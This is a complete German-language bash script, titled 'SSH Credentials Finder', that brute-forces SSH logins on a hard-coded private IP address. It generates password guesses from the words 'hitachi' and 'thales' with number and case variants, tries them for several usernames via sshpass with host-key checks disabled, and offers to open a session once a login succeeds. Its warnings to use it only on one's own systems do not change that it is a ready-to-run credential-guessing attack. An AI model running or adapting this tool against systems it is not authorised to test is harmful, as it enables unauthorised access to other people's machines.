#!/bin/bash

################################################################################
# KONFIGURATION
################################################################################

# WICHTIG: Nur für eigene Systeme verwenden!
# Nicht für unberechtigten Zugriff nutzen!

# Ziel-IP oder Hostname
TARGET_IP="10.42.0.67"

# Port (Standard: 22)
SSH_PORT=22

# Mögliche Benutzernamen (durch Leerzeichen getrennt)
USERNAMES=("hitachi" "thales" "admin")

# Passwort-Phrasen die vorkommen könnten
PHRASE1="hitachi"
PHRASE2="thales"

# Weitere mögliche Passwort-Varianten (optional)
# Hier kannst du zusätzliche komplette Passwörter angeben
EXTRA_PASSWORDS=(
    "thales2020"
    "thales2025"
    "thales123"
    "hitachi2020"
    "hitachi123"
    "hitachi2025"
    "hitachi1234"
)

# Timeout für SSH-Verbindung in Sekunden
SSH_TIMEOUT=5

################################################################################
# SCRIPT - NICHT BEARBEITEN
################################################################################

echo "========================================"
echo "SSH Credentials Finder"
echo "========================================"
echo "WARNUNG: Nur für eigene Systeme nutzen!"
echo "========================================"
echo "Ziel: ${TARGET_IP}:${SSH_PORT}"
echo "Gestartet um $(date +"%H:%M:%S")"
echo "========================================"
echo ""

# Prüfen ob sshpass installiert ist
if ! command -v sshpass &> /dev/null; then
    echo "FEHLER: sshpass ist nicht installiert!"
    echo "Installieren mit: sudo apt install sshpass"
    exit 1
fi

# Funktion zum Testen einer Kombination
test_ssh() {
    local user=$1
    local pass=$2
    
    # SSH-Verbindung testen (nur Verbindung, kein Command)
    if sshpass -p "$pass" ssh -o ConnectTimeout=$SSH_TIMEOUT \
                                 -o StrictHostKeyChecking=no \
                                 -o UserKnownHostsFile=/dev/null \
                                 -o LogLevel=ERROR \
                                 -p $SSH_PORT \
                                 "${user}@${TARGET_IP}" "exit" 2>/dev/null; then
        return 0
    else
        return 1
    fi
}

# Passwort-Kombinationen generieren
generate_passwords() {
    local passwords=()
    
    # Einzelne Phrasen
    passwords+=("$PHRASE1")
    passwords+=("$PHRASE2")
    
    # Kombinationen der Phrasen
    passwords+=("${PHRASE1}${PHRASE2}")
    passwords+=("${PHRASE2}${PHRASE1}")
    passwords+=("${PHRASE1}_${PHRASE2}")
    passwords+=("${PHRASE2}_${PHRASE1}")
    passwords+=("${PHRASE1}-${PHRASE2}")
    passwords+=("${PHRASE2}-${PHRASE1}")
    
    # Mit Zahlen erweitert
    for num in {1..9} 0 12 123 1234 2023 2024 2025 2026; do
        passwords+=("${PHRASE1}${num}")
        passwords+=("${PHRASE2}${num}")
        passwords+=("${num}${PHRASE1}")
        passwords+=("${num}${PHRASE2}")
    done
    
    # Kombinationen mit Zahlen
    passwords+=("${PHRASE1}${PHRASE2}123")
    passwords+=("${PHRASE1}${PHRASE2}1")
    passwords+=("${PHRASE1}1${PHRASE2}")
    passwords+=("1${PHRASE1}${PHRASE2}")
    
    # Groß-/Kleinschreibung Varianten
    passwords+=("$(echo $PHRASE1 | tr '[:lower:]' '[:upper:]')")
    passwords+=("$(echo $PHRASE2 | tr '[:lower:]' '[:upper:]')")
    passwords+=("$(echo $PHRASE1 | sed 's/./\u&/')")  # Erster Buchstabe groß
    passwords+=("$(echo $PHRASE2 | sed 's/./\u&/')")
    
    # Extra Passwörter hinzufügen
    for extra in "${EXTRA_PASSWORDS[@]}"; do
        passwords+=("$extra")
    done
    
    # Duplikate entfernen
    printf '%s\n' "${passwords[@]}" | sort -u
}

# Alle Passwörter generieren
PASSWORD_LIST=($(generate_passwords))

echo "Teste ${#USERNAMES[@]} Benutzernamen mit ${#PASSWORD_LIST[@]} Passwort-Varianten..."
echo "Insgesamt $(( ${#USERNAMES[@]} * ${#PASSWORD_LIST[@]} )) Kombinationen"
echo ""

# Zähler
ATTEMPTS=0
FOUND=0

# Durch alle Kombinationen iterieren
for username in "${USERNAMES[@]}"; do
    echo "Teste Benutzer: $username"
    
    for password in "${PASSWORD_LIST[@]}"; do
        ((ATTEMPTS++))
        
        # Fortschritt anzeigen (jede 10. Kombination)
        if [ $((ATTEMPTS % 10)) -eq 0 ]; then
            echo -ne "  Versuch $ATTEMPTS/$(( ${#USERNAMES[@]} * ${#PASSWORD_LIST[@]} ))...\r"
        fi
        
        # SSH testen
        if test_ssh "$username" "$password"; then
            echo ""
            echo ""
            echo "========================================"
            echo "✓ ERFOLG!"
            echo "========================================"
            echo "Benutzer: $username"
            echo "Passwort: $password"
            echo "========================================"
            echo ""
            FOUND=1
            
            # Verbindungsbefehl anzeigen
            echo "Verbinden mit:"
            echo "  ssh ${username}@${TARGET_IP}"
            echo ""
            
            # Optional: Gleich verbinden?
            read -p "Möchtest du dich jetzt verbinden? (j/n) " -n 1 -r
            echo
            if [[ $REPLY =~ ^[Jj]$ ]]; then
                ssh -p $SSH_PORT "${username}@${TARGET_IP}"
            fi
            
            exit 0
        fi
    done
    
    echo ""
done

echo ""
echo "========================================"
if [ $FOUND -eq 0 ]; then
    echo "Keine gültigen Credentials gefunden."
    echo "Versuche: $ATTEMPTS"
    echo ""
    echo "Tipps:"
    echo "1. Überprüfe die IP-Adresse: $TARGET_IP"
    echo "2. Füge weitere Benutzernamen hinzu"
    echo "3. Passe die Phrasen an (PHRASE1, PHRASE2)"
    echo "4. Ergänze EXTRA_PASSWORDS"
fi
echo "========================================"
